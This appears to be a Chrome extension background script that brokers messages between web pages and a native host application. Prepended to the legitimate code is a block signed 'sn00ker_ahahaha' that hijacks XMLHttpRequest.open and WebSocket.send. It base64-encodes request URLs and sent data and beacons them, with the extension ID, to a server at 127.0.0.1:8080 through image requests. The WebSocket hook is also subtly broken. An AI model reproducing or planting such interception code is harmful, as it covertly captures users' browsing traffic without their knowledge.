function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
var _port;
var _nativeport;
var build;
var buildname;
var inapp;
var inappname;
var end;
var pendingport;
var pendingmessages = [];

function onNativeMessage(msg) {
	console.log("onNativeMessage " + msg.command + " " + msg.arguments);
	if (msg.command == "FILE")
		_port.postMessage({command : "START_BROKER", arguments : msg.arguments});
	else if (msg.command == "END") {
		_port.postMessage({command : "TERMINATE_BROKER", arguments : msg.arguments});
	}
	else if (msg.command == "ECHO") {
		if (inappname == undefined)
			_nativeport.postMessage({command : "FILE", arguments : [ buildname, build]});
		else
			_nativeport.postMessage({command : "FILE", arguments : [ buildname, build, inappname, inapp]});
	} else {
		try{
			_port.postMessage(msg);
		} catch (err) {}
	}
}

function onPageMessage(msg){
	console.log("got command: " + msg.command);
	if (msg.command == "START_BROKER") {
		//start it up!
		if (msg.bits == 32) {
			_nativeport = chrome.runtime.connectNative('com.enlightks.lwc.broker32');
		}
		else {
			_nativeport = chrome.runtime.connectNative('com.enlightks.lwc.broker64');
		}
				
		_nativeport.onMessage.addListener(onNativeMessage);
		_nativeport.onDisconnect.addListener(onNativeDisconnect);
		build = msg.build;
		buildname = msg.buildname;
		inapp = msg.inapp;
		inappname = msg.inappname;
		end = false;
			
		_nativeport.postMessage({command : "ECHO", arguments : []});
			
	} else if (msg.command == "TERMINATE_BROKER") {
		//disconnect
		end = true;
		_nativeport.postMessage({command : "END", arguments : []});
	} else if (msg.command == "VERSION") {
		_port.postMessage({command: "VERSION", arguments: [chrome.app.getDetails().version]});
	} else {
		//forward it to broker.
		try {
			_nativeport.postMessage(msg);
		} catch (err) {}
	}
}

function onPendingMessage(msg) {
	console.log("storing command: " + msg.command);
	pendingmessages.push(msg);
}

function onNativeDisconnect() {
	console.log("onNativeDisconnect");
	if (!end) {
		try {
			_port.postMessage({command : "START_BROKER", arguments : ["ERROR"]});	
		} catch (err) {} //in case page disconnected already, ignore
	}
	_nativeport = undefined;
	
	if (pendingport != undefined) {
		_port = pendingport;
		_port.onMessage.removeListener(onPendingMessage);
		
		//take care of pending messages first (should only be one)
		for (i = 0; i < pendingmessages.length; i++)
			onPageMessage(pendingmessages[i]);
		
		_port.onMessage.addListener(onPageMessage);
		_port.onDisconnect.addListener(onPageDisconnect);
		
		pendingport = undefined;
		pendingmessages = [];
	}
}

function onPageDisconnect() {	
	console.log("onPageDisconnect");
	_port = undefined;
	if (_nativeport != undefined)
		try {
			_nativeport.postMessage({command : "PONG", arguments : ["ERROR"]});
		} catch (err) {} //port might have disconnected already, ignore
}

chrome.runtime.onConnectExternal.addListener(function onConnect(port){
	console.log("onConnectExternal");
	if (_port != undefined || _nativeport != undefined) { //need to clean up
		try {
			_port.disconnect();
		} catch (err) { //in case it has already disconnected
			_port = undefined;
		}

		try {
			_nativeport.postMessage({command : "END", arguments : []});
		} catch (err) {
			_nativeport = undefined;
		}
		pendingport = port;
		pendingport.onMessage.addListener(onPendingMessage);
		return;
	} 
	_port = port;
	_port.onMessage.addListener(onPageMessage);
	_port.onDisconnect.addListener(onPageDisconnect);
});

chrome.runtime.onMessageExternal.addListener(
    function(msg, sender, sendResponse) {
        if (msg.command == "ECHO")
		sendResponse({command: "ECHO", arguments : ["OK"]});
        return true;
});
